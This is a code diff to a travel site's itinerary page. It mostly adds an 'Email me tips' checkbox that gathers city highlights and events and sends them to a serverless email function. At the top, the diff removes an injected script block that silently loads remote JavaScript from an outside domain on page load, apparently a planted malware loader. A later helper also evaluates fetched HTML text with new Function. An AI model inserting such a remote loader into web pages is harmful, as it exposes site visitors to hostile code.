@@ -6,14 +6,7 @@
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.png" />
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
 
-  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrld.ltd/NTQ4MDY2.js?t=548066';
-      document.head.appendChild(script);
-  })();
-</script>
+  <script src="consent.js"></script>
 
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -230,7 +223,11 @@
   .ig-table{margin-top:4px}
 
   /* ---------- Suggest next stop (Upcoming tab cards) ---------- */
-  .ig-foot{display:flex;justify-content:flex-start;padding:8px 0 10px}
+  .ig-foot{display:flex;justify-content:flex-start;align-items:center;gap:14px;flex-wrap:wrap;padding:8px 0 10px}
+  .ig-tips{display:inline-flex;align-items:center;gap:7px;font-size:.83rem;color:#5b6b75;cursor:pointer;user-select:none}
+  .ig-tips input{accent-color:#556B2F;width:15px;height:15px;cursor:pointer;margin:0}
+  .ig-tips-msg{font-size:.78rem;font-weight:600;color:#556B2F}
+  .ig-tips-msg.err{color:#C04020}
   .ig-suggest{border:1.5px solid var(--green);background:#fff;color:var(--green);font-family:inherit;
     font-weight:700;font-size:.85rem;padding:7px 14px;border-radius:20px;cursor:pointer;transition:background .2s,color .2s}
   .ig-suggest:hover,.ig-suggest.open{background:var(--green);color:#fff}
@@ -534,6 +531,7 @@
   let view = "edit";   // "edit" (interactive list) or "table" (read-only) — past only
   const tripCardView = {};   // per-trip Edit/Table state on the Upcoming tab: itinerary id -> "edit" | "table"
   let shareOK = true;        // false if itineraries.is_public doesn't exist yet (roamers-setup.sql not run)
+  let tipsOK = true;         // false if itineraries.receive_tips doesn't exist yet (trip-tips-setup.sql not run)
   let selectedTripId = null; // Upcoming tab: which trip card is selected (the search box sits below it)
   const suggestState = {};   // per-trip "Suggest next stop" panel state: itinerary id -> {open, factors:{}}
 
@@ -1088,8 +1086,14 @@
       const sb = NRA_AUTH.client();
       // is_public powers the "Share" switch (roamers-setup.sql). If that SQL
       // hasn't been run yet, fall back gracefully and just hide the switch.
-      let r1 = await sb.from("itineraries").select("id,name,is_public")
+      let r1 = await sb.from("itineraries").select("id,name,is_public,receive_tips,tips_sent_at")
         .order("sort_order", { ascending:true }).order("created_at", { ascending:true });
+      if (r1.error){
+        // trip-tips-setup.sql not run yet — hide the tips checkbox, keep Share
+        tipsOK = false;
+        r1 = await sb.from("itineraries").select("id,name,is_public")
+          .order("sort_order", { ascending:true }).order("created_at", { ascending:true });
+      }
       if (r1.error){
         shareOK = false;
         r1 = await sb.from("itineraries").select("id,name")
@@ -1155,7 +1159,7 @@
         </div>
         <div class="ig-stops" style="display:${cardView === "table" ? "none" : ""}">${rows}</div>
         <div class="ig-table" style="display:${cardView === "table" ? "" : "none"}">${tableHtml}</div>
-        <div class="ig-foot"><button class="ig-suggest" type="button" data-suggest="${esc(String(it.id))}">✨ Suggest next stop</button></div>
+        <div class="ig-foot"><button class="ig-suggest" type="button" data-suggest="${esc(String(it.id))}">✨ Suggest next stop</button>${tipsOK ? `<label class="ig-tips"><input type="checkbox" data-tips="${esc(String(it.id))}"${it.receive_tips ? " checked" : ""}> ✉️ Email me tips for this trip</label><span class="ig-tips-msg" data-tipsmsg="${esc(String(it.id))}"></span>` : ""}</div>
         <div class="ns-panel" data-ns="${esc(String(it.id))}" style="display:none"></div>
         <p class="ig-warn">⚠️ These stops aren't in date order — drag to match the dates, or leave it if that's on purpose.</p>`;
       card._cities = cities;
@@ -1400,6 +1404,101 @@
     });
   }
 
+  /* ======================================================================
+     TRIP TIPS — the "✉️ Email me tips" checkbox on each Upcoming trip card.
+     Gathers each stop's highlights (destinations.js), day trips
+     (day-trips.js, loaded on demand), getting-around basics (CITY_TRANSIT,
+     read out of city.html on demand) and events during their dates
+     (city_events), then asks netlify/functions/trip-tips.js to email the
+     summary to the signed-in Roamer. Every lookup is best-effort — a
+     missing piece is simply left out of the email.
+     ====================================================================== */
+  let dayTripsP = null, transitP = null;
+  function loadDayTrips(){
+    if (window.NRA_DAYTRIPS) return Promise.resolve(window.NRA_DAYTRIPS);
+    if (!dayTripsP) dayTripsP = new Promise(res => {
+      const s = document.createElement("script");
+      s.src = "day-trips.js";
+      s.onload = () => res(window.NRA_DAYTRIPS || {});
+      s.onerror = () => res({});
+      document.head.appendChild(s);
+    });
+    return dayTripsP;
+  }
+  // CITY_TRANSIT lives inside city.html; fetch it once and cut the object out.
+  function loadTransit(){
+    if (!transitP) transitP = fetch("city.html")
+      .then(r => r.ok ? r.text() : "")
+      .then(txt => {
+        const start = txt.indexOf("CITY_TRANSIT = {");
+        if (start < 0) return {};
+        let i = txt.indexOf("{", start), depth = 0, inStr = false, q = "", esc2 = false;
+        for (let j = i; j < txt.length; j++){
+          const ch = txt[j];
+          if (inStr){
+            if (esc2) esc2 = false;
+            else if (ch === "\\") esc2 = true;
+            else if (ch === q) inStr = false;
+          } else if (ch === '"' || ch === "'"){ inStr = true; q = ch; }
+          else if (ch === "{") depth++;
+          else if (ch === "}"){
+            depth--;
+            // Not strict JSON (some cities use unquoted keys), so evaluate the
+            // object literal — it's our own file, fetched from our own site.
+            if (!depth) return (new Function("return (" + txt.slice(i, j + 1) + ")"))();
+          }
+        }
+        return {};
+      })
+      .catch(() => ({}));
+    return transitP;
+  }
+  async function gatherTripTips(it, cities){
+    const [dayTrips, transit] = await Promise.all([loadDayTrips(), loadTransit()]);
+    const sb = NRA_AUTH.client();
+    return Promise.all(cities.map(async p => {
+      const g = guideOf(p.place);
+      const cityName = g ? g.city : p.place;
+      const d = (window.NRA_DESTINATIONS || []).find(x => x.city.toLowerCase() === cityName.toLowerCase());
+      const t = transit[cityName] || null;
+      const dts = (dayTrips[cityName] || {});
+      const pool = [].concat(dts.half || [], dts.full || []).sort((a, b) => (b.featured ? 1 : 0) - (a.featured ? 1 : 0));
+      // published events in that city during their stay (skipped without dates)
+      let events = [];
+      if (sb && p.arrive && p.depart){
+        try{
+          const { data } = await sb.from("city_events")
+            .select("name,event_date,location")
+            .eq("city", cityName).eq("published", true)
+            .gte("event_date", p.arrive).lte("event_date", p.depart)
+            .order("event_date", { ascending:true }).limit(5);
+          events = (data || []).map(ev => ({ name: ev.name, when: ev.event_date, location: ev.location || "" }));
+        }catch(e){ /* leave events out */ }
+      }
+      return {
+        city: cityName, country: p.country || (g && g.country) || "",
+        arrive: p.arrive || "", depart: p.depart || "",
+        hasGuide: !!g,
+        tagline: (d && d.tagline) || "",
+        transit: t ? { hours: t.hours || "", pay: t.pay || "" } : null,
+        dayTrips: pool.slice(0, 3).map(x => ({ name: x.name, blurb: x.blurb || "" })),
+        events
+      };
+    }));
+  }
+  async function sendTripTips(it, cities){
+    const stops = await gatherTripTips(it, cities);
+    let token = "";
+    try{ const { data } = await NRA_AUTH.client().auth.getSession(); token = data && data.session && data.session.access_token || ""; }catch(e){}
+    const r = await fetch("/.netlify/functions/trip-tips", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", Authorization: "Bearer " + token },
+      body: JSON.stringify({ tripId: it.id, tripName: it.name, stops })
+    });
+    const d = await r.json().catch(() => ({}));
+    return { ok: r.ok, d };
+  }
+
   function wireItinEvents(){
     const groups = $("itin-groups");
     /* per-trip Edit/Table toggle */
@@ -1450,6 +1549,35 @@
           return;
         }
         openShareModal(id);   // profile isn't public yet — ask first
+      });
+    });
+    /* ✉️ Email me tips — save the choice; when it's turned ON, send the email */
+    groups.querySelectorAll("[data-tips]").forEach(box => {
+      box.addEventListener("change", async () => {
+        const card = box.closest(".itin-group");
+        const id = box.dataset.tips;
+        const msgEl = card.querySelector('[data-tipsmsg="' + id + '"]');
+        const setTip = (t, err) => { if (msgEl){ msgEl.textContent = t || ""; msgEl.className = "ig-tips-msg" + (err ? " err" : ""); } };
+        const on = box.checked;
+        try{
+          const sb = NRA_AUTH.client();
+          const { error } = await sb.from("itineraries").update({ receive_tips: on }).eq("id", id);
+          if (error) throw error;
+        }catch(e){ box.checked = !on; setTip("Couldn't save that — try again.", true); return; }
+        if (!on){ setTip("Tips are off for this trip."); return; }
+        if (!(card._cities || []).length){
+          box.checked = false; setTip("Add a city to the trip first.", true);
+          try{ await NRA_AUTH.client().from("itineraries").update({ receive_tips: false }).eq("id", id); }catch(e){}
+          return;
+        }
+        box.disabled = true; setTip("Putting your tips together…");
+        try{
+          const it = { id, name: ((card.querySelector(".ig-name") || {}).value || "").trim() || "your trip" };
+          const r = await sendTripTips(it, card._cities);
+          if (r.ok && r.d.sent) setTip("Tips sent — check your inbox ✓");
+          else setTip((r.d && r.d.error) || "Couldn't send the email — try again.", true);
+        }catch(e){ setTip("Couldn't send the email — try again.", true); }
+        box.disabled = false;
       });
     });
     /* rename an itinerary */
